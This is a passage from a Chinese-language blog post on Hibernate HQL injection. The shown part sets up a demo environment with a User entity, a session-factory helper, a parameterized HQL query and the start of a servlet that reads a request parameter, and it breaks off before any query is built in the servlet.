<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;mapping</span> <span class="na">class=</span><span class="s">&#34;com.example.User&#34;</span><span class="nt">/&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>3）创建模型类</strong></p>
<p>创建一个Java类作为模型类，将数据库表映射为相关的类。</p>
<p>新建了一个User类，对应users表，声明其中相对应的列名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.persistence.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Entity</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Table</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;users&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">User</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Id</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@GeneratedValue</span><span class="p">(</span><span class="n">strategy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GenerationType</span><span class="p">.</span><span class="na">IDENTITY</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">id</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Column</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;name&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Column</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;email&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">email</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Getter and Setter for id</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getId</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">id</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setId</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">id</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">id</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Getter and Setter for name</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Getter and Setter for email</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getEmail</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">email</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setEmail</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">email</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">email</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">email</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Optional: Override toString() for better logging</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">toString</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;User{&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;id=&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;, name=&#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="sc">&#39;\&#39;&#39;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;, email=&#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="sc">&#39;\&#39;&#39;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="sc">&#39;}&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>使用注解将类映射到数据库表。</p>
<p><strong>4）SessionFactory类</strong></p>
<p>创建工具类<code>HibernateUtil</code>以管理Session：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.hibernate.SessionFactory</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.hibernate.cfg.Configuration</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">HibernateUtil</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">SessionFactory</span><span class="w"> </span><span class="n">sessionFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buildSessionFactory</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">SessionFactory</span><span class="w"> </span><span class="nf">buildSessionFactory</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Configuration</span><span class="p">().</span><span class="na">configure</span><span class="p">().</span><span class="na">buildSessionFactory</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Throwable</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ExceptionInInitializerError</span><span class="p">(</span><span class="n">ex</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">SessionFactory</span><span class="w"> </span><span class="nf">getSessionFactory</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">sessionFactory</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">  </span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>5）使用HQL查询</strong></p>
<p>在Main类中编写查询代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.hibernate.Session</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.hibernate.query.Query</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Session</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HibernateUtil</span><span class="p">.</span><span class="na">getSessionFactory</span><span class="p">().</span><span class="na">openSession</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">session</span><span class="p">.</span><span class="na">beginTransaction</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// HQL查询示例  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Query</span><span class="o">&lt;</span><span class="n">User</span><span class="o">&gt;</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">createQuery</span><span class="p">(</span><span class="s">&#34;FROM User WHERE email = :email&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">User</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">query</span><span class="p">.</span><span class="na">setParameter</span><span class="p">(</span><span class="s">&#34;email&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;test@example.com&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">query</span><span class="p">.</span><span class="na">uniqueResult</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;User: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">user</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">session</span><span class="p">.</span><span class="na">getTransaction</span><span class="p">().</span><span class="na">commit</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">session</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">  </span></span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250311212358297.png" alt="image-20250311212358297" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250311212358297.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250311212358297.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250311212358297.png?size=large 2x" data-title="image-20250311212358297" style="--width: 2802px;--aspect-ratio: 2802 / 1916;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>上图是配置文件中没加<code>&lt;property name=&quot;hibernate.format_sql&quot;&gt;true&lt;/property&gt;</code> 时的输出，懒得改了</p>
<h3 id="4web示例代码" class="heading-element"><span>4、Web示例代码</span>
  <a href="#4web%e7%a4%ba%e4%be%8b%e4%bb%a3%e7%a0%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>基于上述代码，将其改为Web服务</p>
<p>文件目录：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">src/main/
</span></span><span class="line"><span class="cl">  ├── java/
</span></span><span class="line"><span class="cl">  │     └── com/example/
</span></span><span class="line"><span class="cl">  │           ├── User.java
</span></span><span class="line"><span class="cl">  │           ├── HibernateUtil.java
</span></span><span class="line"><span class="cl">  │           └── UserServlet.java
</span></span><span class="line"><span class="cl">  ├── resources/
</span></span><span class="line"><span class="cl">  │     └── hibernate.cfg.xml
</span></span><span class="line"><span class="cl">  └── webapp/
</span></span><span class="line"><span class="cl">        └── WEB-INF/
</span></span><span class="line"><span class="cl">              └── web.xml</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312010429494.png" alt="image-20250312010429494" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312010429494.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312010429494.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312010429494.png?size=large 2x" data-title="image-20250312010429494" style="--width: 734px;--aspect-ratio: 734 / 1168;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h4 id="userservlet类" class="heading-element"><span>UserServlet类</span>
  <a href="#userservlet%e7%b1%bb" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.annotation.WebServlet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServlet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletResponse</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.PrintWriter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.hibernate.Session</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.hibernate.query.Query</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@WebServlet</span><span class="p">(</span><span class="s">&#34;/user&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">UserServlet</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">HttpServlet</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">resp</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/plain&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resp</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">parameter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">parameter</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">parameter</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Error: &#39;name&#39; parameter is required.&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
